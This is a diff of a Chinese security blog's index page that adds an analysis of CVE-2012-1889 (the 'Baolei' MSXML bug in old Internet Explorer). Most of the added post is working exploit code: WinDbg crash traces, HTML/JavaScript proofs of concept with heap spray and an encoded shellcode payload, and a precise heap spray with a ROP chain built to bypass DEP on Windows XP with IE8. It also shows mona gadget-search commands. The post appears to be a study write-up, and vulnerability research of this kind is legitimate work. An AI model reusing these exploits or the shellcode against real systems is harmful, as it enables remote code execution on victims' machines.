@@ -157,6 +157,187 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-exploit3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CVE<br>EXPLOIT_DB</p>
+<p>代理方向代理洋葱浏览器<br>3389</p>
+<p>精准堆喷射</p>
+<p>XCHG eax,esp<br>retn</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/24/exploit3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-暴雷漏洞分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/24/暴雷漏洞分析/">暴雷漏洞分析</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/24/暴雷漏洞分析/" class="archive-article-date">
+  	<time datetime="2018-10-24T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-24</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <table>
+<thead>
+<tr>
+<th style="text-align:left">环境</th>
+<th style="text-align:center">DEP</th>
+<th style="text-align:right">ASLR</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">WinXP sp3 Ie6</td>
+<td style="text-align:center">否</td>
+<td style="text-align:right">否</td>
+</tr>
+<tr>
+<td style="text-align:left">WinXP sp3 Ie8</td>
+<td style="text-align:center">是</td>
+<td style="text-align:right">否</td>
+</tr>
+<tr>
+<td style="text-align:left">Win7 32b Ie8</td>
+<td style="text-align:center">是</td>
+<td style="text-align:right">是</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>初步分析</p>
+</blockquote>
+<p>CVE-2012-1889暴雷漏洞是Microsoft XML CoreServices 3.0~6.0版本中存在漏洞，该漏洞源于访问未初始化内存的位置。远程攻击者可借助特制的web站点利用该漏洞执行任意代码或导致拒绝服务。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#html代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CVE 2012-1889 PoC v1 By:15PB&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt; &lt;/object&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&apos;15PB&apos;).object.definition(0);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#windgb异常中断点</span><br><span class="line">5dd8d74b 0f8cc7000000    jl      msxml3!DllUnregisterServer+0xa94 (5dd8d818)</span><br><span class="line">5dd8d751 8b45ec          mov     eax,dword ptr [ebp-14h] ;1.eax= [ebp-14h]</span><br><span class="line">5dd8d754 3bc3            cmp     eax,ebx</span><br><span class="line">5dd8d756 8bf0            mov     esi,eax</span><br><span class="line">5dd8d758 7426            je      msxml3!DllUnregisterServer+0x9fc (5dd8d780)</span><br><span class="line">5dd8d75a ff7528          push    dword ptr [ebp+28h]</span><br><span class="line">5dd8d75d 8b08            mov     ecx,dword ptr [eax] ;2.ecx = [eax]</span><br><span class="line">5dd8d75f ff7524          push    dword ptr [ebp+24h]</span><br><span class="line">5dd8d762 ff7520          push    dword ptr [ebp+20h]</span><br><span class="line">5dd8d765 57              push    edi</span><br><span class="line">5dd8d766 6a03            push    3</span><br><span class="line">5dd8d768 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">5dd8d76b 68f8a7d85d      push    offset msxml3!DllGetClassObject+0x16fde (5dd8a7f8)</span><br><span class="line">5dd8d770 53              push    ebx</span><br><span class="line">5dd8d771 50              push    eax</span><br><span class="line">5dd8d772 ff5118          call    dword ptr [ecx+18h]  ;3.call [ecx+18h]漏洞点</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Windows xp sp3 ie6</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#POC代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CVE 2012-1889 PoC v2 By:15PB.Com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt;&lt;/object&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">            // 获取名为15PB的对象，并将其保存到名为obj15PB实例中</span><br><span class="line">        var obj15PB = document.getElementById(&apos;15PB&apos;).object;</span><br><span class="line">                // 初始化数据变量srcImgPath的内容（unescape()是解码函数）</span><br><span class="line">        var srcImgPath = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">                // 构建一个长度为0x1000字节的数据</span><br><span class="line">        while (srcImgPath.length &lt; 0x1000)</span><br><span class="line">            srcImgPath += srcImgPath;</span><br><span class="line">                // 构建一个长度为0x1000[4096*2]的数据，起始内容为“\\15PB_Com”</span><br><span class="line">        srcImgPath = &quot;\\\\15PB_Com&quot; + srcImgPath;</span><br><span class="line">                nLenth     = 0x1000-4-2-1; // 4=堆长度信息 2=堆结尾信息 1=0x00</span><br><span class="line">        srcImgPath = srcImgPath.substr(0, nLenth);</span><br><span class="line">        // 创建一个图片元素，并将图片源路径设为srcImgPath</span><br><span class="line">        var emtPic = document.createElement(&quot;img&quot;);</span><br><span class="line">        emtPic.src = srcImgPath;</span><br><span class="line">        emtPic.nameProp;       // 返回当前图片文件名（载入路径）</span><br><span class="line">        obj15PB.definition(0); // 定义对象（触发溢出）</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">5dd8d751 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">5dd8d754 3bc3            cmp     eax,ebx</span><br><span class="line">5dd8d756 8bf0            mov     esi,eax</span><br><span class="line">5dd8d758 7426            je      msxml3!DllUnregisterServer+0x9fc (5dd8d780)</span><br><span class="line">5dd8d75a ff7528          push    dword ptr [ebp+28h]</span><br><span class="line">5dd8d75d 8b08            mov     ecx,dword ptr [eax]  ds:0023:0c0c0c0c=????????</span><br><span class="line">5dd8d75f ff7524          push    dword ptr [ebp+24h]</span><br><span class="line">5dd8d762 ff7520          push    dword ptr [ebp+20h]</span><br><span class="line">5dd8d765 57              push    edi</span><br><span class="line">5dd8d766 6a03            push    3</span><br><span class="line">5dd8d768 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">5dd8d76b 68f8a7d85d      push    offset msxml3!DllGetClassObject+0x16fde (5dd8a7f8)</span><br><span class="line">5dd8d770 53              push    ebx</span><br><span class="line">5dd8d771 50              push    eax</span><br><span class="line">5dd8d772 ff5118          call    dword ptr [ecx+18h]</span><br><span class="line"></span><br><span class="line">eax指向0x0c0c0c0c,如果使用堆喷射的技术,使0x0c0c0c0c地址的内容也为0x0c0c0c0c,</span><br><span class="line">则最后会call [0x0c0c0c0c + 18h] = [0x0c0c0c24h]</span><br><span class="line">如果0x0c0c0c24h内容也会0x0c0c0c0c,会call 0x0c0c0c0c0c.</span><br><span class="line">而0c0c汇编成指令为(or al,C),在shellcode执行前的寄存器的改变等于NOP,所以可以采用堆喷射技术实现任意代码执行</span><br></pre></td></tr></table></figure>
+<ul>
+<li>堆喷射<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">为了能覆盖0x0c0c0c0c,需要申请200M的内存空间。</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CVE 2012-1889 PoC v2 By:15PB.Com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt;&lt;/object&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">		//1.准备shellcode</span><br><span class="line">		var cShellcode = unescape(</span><br><span class="line">		&quot;\uC033\uFFE8\uFFFF\uC3FF\u8D58\u1B70\uC933\uB966\u0186\u048A\u340E\u8817\u0E04\uF6E2\u3480\u170E\uE6FF\u9477\u77FB\u26FC\u727C\u7965\u7B72\u2524\u7339\u7B7B\u7217\u96A7\u4218\u7264\u2465\u3925\u7B73\u177B\u6703\uC32B\uB405\uD188\u725F\u7B7B\u3778\u6540\u7B78\u3673\uFF17\u1717\u1717\u734C\u229C\u1727\u1717\u619C\u9C1B\u0B61\u219C\u419C\u441F\u5C9A\u46C0\uFF45\u177C\u1717\u7D47\u7D17\u9A17\uDD5C\uE846\u9CC7\u4FC7\u444C\u4547\uD3FF\u1717\u4217\uFB9C\uFB94\uD013\uEB52\u1717\u1717\u4145\u4440\u9C46\u1F62\uDE24\uD724\u139D\u9319\u63D7\u9C0F\uEB4A\uCF14\uF4D6\u9C0E\uEB42\uC714\uFDD6\u1C10\u9ECD\uEB4A\uFC56\u9CF6\uEB4A\u429C\u241B\u2CD7\u62CD\uAF12\u1716\u1717\u494E\u4C48\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u451B\u9C44\u1F42\u659C\u9A2B\u2523\u619C\u9A6F\u2523\u699C\u9A0B\u2D2B\u6A9E\u9CEB\u3769\u2B9A\u9E2D\uEF6A\u699C\u9A33\u2D2B\u6A9E\u24E3\uFCDE\u5616\u629C\u9CEF\u9923\u429C\u9A1F\u0123\u6A9C\u9C1B\u4028\uFF41\uE84A\uE8E8\uD792\uF463\u629C\u24E3\u71E8\u2B9C\u9C59\uEB62\u239C\u9CA9\u1F42\u139A\u4C01\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u9C1F\u074A\u5C9A\u7DCC\u7D17\u4617\u42E8\u9C1B\u074A\u5C9A\u46F1\uFF47\uE878\uE8E8\u4A9C\u9E07\uEB52\u5C9A\u46FD\u5A9C\u461F\u4BFF\uE8E8\u9EE8\uEF52\uC524\u9C45\u074A\u5C9A\u46F9\u4546\u42E8\u7DEB\uE817\uEF42\uF29C\uD54A\u171B&quot;)</span><br><span class="line">		//2.制造滑块数据</span><br><span class="line">		//2.1计算填充滑块指令数据大小</span><br><span class="line">		var nSlideSize = 1024*1024 / 2; // 一个滑板指令区的大小（1MB）</span><br><span class="line">	    var nMlcHadSize = 32 / 2; // 堆头部大小</span><br><span class="line">	    var nStrLenSize = 4 / 2; // 堆长度信息大小</span><br><span class="line">	    var nTerminatorSize = 2 / 2; // 堆结尾符号大小</span><br><span class="line">	    var nScSize = cShellcode.length; // Shellcode大小</span><br><span class="line">	    var nFillSize = nSlideSize-nMlcHadSize-nStrLenSize-nScSize-nTerminatorSize;</span><br><span class="line">		//2.2填充滑块指令</span><br><span class="line">		var cFillData = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">		var cSlideData = new Array(); //申请数组对象保存滑板数据</span><br><span class="line">		while(cFillData.length &lt; nSlideSize)</span><br><span class="line">			cFillData+= cFillData;</span><br><span class="line">		for(var i=0;i&lt;200;i++)&#123;</span><br><span class="line">			cFillData = cFillData.substring(0,nFillSize);</span><br><span class="line">			cSlideData[i] = cFillData + cShellcode;</span><br><span class="line">		&#125;</span><br><span class="line">        // 4.触发CVE 2012-1889漏洞</span><br><span class="line">		// 获取名为15PB的对象，并将其保存到名为obj15PB实例中</span><br><span class="line">        var obj15PB = document.getElementById(&apos;15PB&apos;).object;</span><br><span class="line">        // 初始化数据变量srcImgPath的内容（unescape()是解码函数）</span><br><span class="line">        var srcImgPath = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">        // 构建一个长度为0x1000字节的数据</span><br><span class="line">        while (srcImgPath.length &lt; nSlideSize)</span><br><span class="line">            srcImgPath += srcImgPath;</span><br><span class="line">        // 构建一个长度为0x1000[4096*2]的数据，起始内容为“\\15PB_Com”</span><br><span class="line">        srcImgPath = &quot;\\\\15PB_Com&quot; + srcImgPath;</span><br><span class="line">                nLenth     = 0x1000-4-2-1; // 4=堆长度信息 2=堆结尾信息 1=0x00</span><br><span class="line">        srcImgPath = srcImgPath.substr(0, nLenth);</span><br><span class="line">        // 创建一个图片元素，并将图片源路径设为srcImgPath</span><br><span class="line">        var emtPic = document.createElement(&quot;img&quot;);</span><br><span class="line">        emtPic.src = srcImgPath;</span><br><span class="line">        emtPic.nameProp;       // 返回当前图片文件名（载入路径）</span><br><span class="line">        obj15PB.definition(0); // 定义对象（触发溢出）</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_1.png" alt=""></p>
+<blockquote>
+<p>Windows xp sp3 ie8</p>
+</blockquote>
+<p>由于ie8有了DEP保护,所以没有执行payload,而是直接出现异常中断<br><img src="http://picture.jbyusk.com:8080/exploit/CVE-2012-1889_2.png" alt=""></p>
+<ul>
+<li>精准Heap Spray<br>要绕过DEP需要使用Ret2Libc技术,依赖于栈,所以需要使用xchg命令使esp指向堆的地址<br>但是原本的Heap Spray执行的位置是不确定的,所以需要使用精准Heap Spray使call dword ptr [ecx+18h]刚好执行xchg</li>
+</ul>
+<p>内存的分机是以一个分页为单位的，大多数的X86系统中，分页为4KB，= 0x1000字节<br>计算这个地址与当前分页页首的相对偏移：<br>相对偏移= （目标地址-UserPtr地址）% 0x1000 / 2;<br>在windbg使用!heap -p -a 0x0c0c0c0c获取UserPtr地址为0c070020，则偏移为5F6<br>其中精准喷射，每块的数据大小是0x1000,但是需要对字符进行选取,用到块大小的计算:<br>cBlock = cBlock.substring(2,nBlockSize-0x21);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">!py mona find -s &quot;\x87\xCC\xC3&quot; // xchg ecx,esp;ret;</span><br><span class="line">!py mona find -s &quot;\x5B\xC3&quot; // pop ebx; ret;</span><br><span class="line">!py mona find -s &quot;\xC3&quot; //查找ret;</span><br><span class="line">u VirtualProtect //查找VirtualProtect地址</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CVE 2012-1889 PoC v2 By:15PB.Com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;object classid=&quot;clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4&quot; id=&apos;15PB&apos;&gt;&lt;/object&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">		//1.生成相对偏移前的padding</span><br><span class="line">		var cPadding = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">		while(cPadding.length &lt; 0x1000)</span><br><span class="line">			cPadding += cPadding;</span><br><span class="line">		cPadding = cPadding.substring(0,0x5F6);</span><br><span class="line">		//2.制作RetLibc目前设置是为了查找真实跳转</span><br><span class="line">		//7C96D0FB(87 CC c3 xchg esp,ecx;ret;) 77be637d(C3 ret;) 0x77bf1d16(58 c3 pop ebx;ret;) 7c801ad4 VirtualProtect</span><br><span class="line">		var cRet2Libc = unescape(</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u637d\u77be&quot; +</span><br><span class="line">		&quot;\u1d16\u77bf&quot; +</span><br><span class="line">		&quot;\uD0FB\u7C96&quot; +</span><br><span class="line">		&quot;\u1ad4\u7c80&quot; +</span><br><span class="line">		&quot;\u0C40\u0C0C&quot; +</span><br><span class="line">		&quot;\u0C40\u0C0C&quot; +</span><br><span class="line">		&quot;\u1000\u0000&quot; +</span><br><span class="line">		&quot;\u0040\u0000&quot; +  </span><br><span class="line">		&quot;\uf123\u77C2&quot;);</span><br><span class="line">		//3.准备shellcode</span><br><span class="line">		var cShellcode = unescape(</span><br><span class="line">		&quot;\uC033\uFFE8\uFFFF\uC3FF\u8D58\u1B70\uC933\uB966\u0186\u048A\u340E\u8817\u0E04\uF6E2\u3480\u170E\uE6FF\u9477\u77FB\u26FC\u727C\u7965\u7B72\u2524\u7339\u7B7B\u7217\u96A7\u4218\u7264\u2465\u3925\u7B73\u177B\u6703\uC32B\uB405\uD188\u725F\u7B7B\u3778\u6540\u7B78\u3673\uFF17\u1717\u1717\u734C\u229C\u1727\u1717\u619C\u9C1B\u0B61\u219C\u419C\u441F\u5C9A\u46C0\uFF45\u177C\u1717\u7D47\u7D17\u9A17\uDD5C\uE846\u9CC7\u4FC7\u444C\u4547\uD3FF\u1717\u4217\uFB9C\uFB94\uD013\uEB52\u1717\u1717\u4145\u4440\u9C46\u1F62\uDE24\uD724\u139D\u9319\u63D7\u9C0F\uEB4A\uCF14\uF4D6\u9C0E\uEB42\uC714\uFDD6\u1C10\u9ECD\uEB4A\uFC56\u9CF6\uEB4A\u429C\u241B\u2CD7\u62CD\uAF12\u1716\u1717\u494E\u4C48\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u451B\u9C44\u1F42\u659C\u9A2B\u2523\u619C\u9A6F\u2523\u699C\u9A0B\u2D2B\u6A9E\u9CEB\u3769\u2B9A\u9E2D\uEF6A\u699C\u9A33\u2D2B\u6A9E\u24E3\uFCDE\u5616\u629C\u9CEF\u9923\u429C\u9A1F\u0123\u6A9C\u9C1B\u4028\uFF41\uE84A\uE8E8\uD792\uF463\u629C\u24E3\u71E8\u2B9C\u9C59\uEB62\u239C\u9CA9\u1F42\u139A\u4C01\u9C4D\u4AF2\u1FD5\u4217\uFB9C\uFB94\u9C1F\u074A\u5C9A\u7DCC\u7D17\u4617\u42E8\u9C1B\u074A\u5C9A\u46F1\uFF47\uE878\uE8E8\u4A9C\u9E07\uEB52\u5C9A\u46FD\u5A9C\u461F\u4BFF\uE8E8\u9EE8\uEF52\uC524\u9C45\u074A\u5C9A\u46F9\u4546\u42E8\u7DEB\uE817\uEF42\uF29C\uD54A\u171B&quot;)</span><br><span class="line">		//4.制造滑块数据</span><br><span class="line">		//4.1计算填充滑块指令数据大小</span><br><span class="line">		var nSlideSize = 0x1000; // 一个滑板指令区的大小（4kb）</span><br><span class="line">	    var nPadSize = cPadding.length; // padding</span><br><span class="line">	    var nR2LSize = cRet2Libc.length; // cRet2Libc大小</span><br><span class="line">	    var nScSize = cShellcode.length; // Shellcode大小</span><br><span class="line">	    var nFillSize = nSlideSize-nPadSize-nR2LSize-nScSize;</span><br><span class="line">		//4.2填充滑块指令</span><br><span class="line">		var cFillData = unescape(&quot;\u0C0C\u0C0C&quot;);</span><br><span class="line">		while(cFillData.length &lt; nSlideSize)</span><br><span class="line">			cFillData+= cFillData;</span><br><span class="line">		cFillData = cFillData.substring(0,nFillSize);</span><br><span class="line">		//5.构造滑板指令数据块</span><br><span class="line">		var nBlockSize = 0x40000; //256kb</span><br><span class="line">		var cBlock = cPadding + cRet2Libc + cShellcode + cFillData;</span><br><span class="line">		while(cBlock.length &lt; nBlockSize)</span><br><span class="line">			cBlock += cBlock;</span><br><span class="line">		cBlock = cBlock.substring(2,nBlockSize-0x21);</span><br><span class="line">		//6.填充200M内存空间,申请800块大小的滑板数据区</span><br><span class="line">		var cSlideData = new Array()</span><br><span class="line">		for(var i=0;i&lt;800;i++)&#123;</span><br><span class="line">			cSlideData[i] = cBlock.substr(0,cBlock.length);</span><br><span class="line">		&#125;</span><br><span class="line">        // 4.触发CVE 2012-1889漏洞</span><br><span class="line">		// 获取名为15PB的对象，并将其保存到名为obj15PB实例中</span><br><span class="line">        var obj15PB = document.getElementById(&apos;15PB&apos;).object;</span><br><span class="line">        // 初始化数据变量srcImgPath的内容（unescape()是解码函数）</span><br><span class="line">        var srcImgPath = unescape(&quot;\u0C0C\u0C08&quot;);</span><br><span class="line">        // 构建一个长度为0x1000字节的数据</span><br><span class="line">        while (srcImgPath.length &lt; nSlideSize)</span><br><span class="line">            srcImgPath += srcImgPath;</span><br><span class="line">        // 构建一个长度为0x1000[4096*2]的数据，起始内容为“\\15PB_Com”</span><br><span class="line">        srcImgPath = &quot;\\\\15PB_Com&quot; + srcImgPath;</span><br><span class="line">                nLenth     = 0x1000-4-2-1; // 4=堆长度信息 2=堆结尾信息 1=0x00</span><br><span class="line">        srcImgPath = srcImgPath.substr(0, nLenth);</span><br><span class="line">        // 创建一个图片元素，并将图片源路径设为srcImgPath</span><br><span class="line">        var emtPic = document.createElement(&quot;img&quot;);</span><br><span class="line">        emtPic.src = srcImgPath;</span><br><span class="line">        emtPic.nameProp;       // 返回当前图片文件名（载入路径）</span><br><span class="line">        obj15PB.definition(0); // 定义对象（触发溢出）</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/24/暴雷漏洞分析/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-Windbg之Mona2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -866,20 +1047,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-2.CPU上下文切换" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-3.CPU使用率到100%" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/2.CPU上下文切换/">2.CPU上下文切换</a>
+      <a class="article-title" href="/2018/09/30/3.CPU使用率到100%/">3.CPU使用率到100%</a>
     </h1>
   
 
 		
         
-        <a href="/2018/09/30/2.CPU上下文切换/" class="archive-article-date">
+        <a href="/2018/09/30/3.CPU使用率到100%/" class="archive-article-date">
   	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
 </a>
         
@@ -888,31 +1069,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>在很短时间内,CPU进行任务切换,造成多任务的错觉。<br>而每个任务运行前,CPU根据CPU寄存器和程序技术器获得任务从哪加载,从哪运行。<br>而保持这些数据的环境为CPU上下文。<br>根据任务不同,分为进程上下文切换,线程上下文切换和中断上下文切换</p>
-<blockquote>
-<p>进程上下文切换<br>区分系统调用和进程上下文切换</p>
-</blockquote>
-<p>系统调用不涉及虚拟内存等用户态的资源,一直在同一个进程中进行。<br>进程上下文切换是从一个进程切换到另一个进程中运行。进程的上下文中包括虚拟内存,栈,全局变量以及内核堆栈和寄存器等内核空间的状态。<br>linux通过TLB管理虚拟内存到物理内存的映射关系,当虚拟内存刷新时,TLB也需要刷新,内存访问也会变量.对于多处理器系统,缓存是共享的,刷新缓存不仅会影响当前处理器的进程,还会影响共享缓存的其他处理器的进程。<br>linux为CPU维护一个就绪队列,根据优先级和等待CPU的时间排序,然后选择最需要的CPU进程(优先级最高和等待cpu时间最长的进程)。</p>
-<ul>
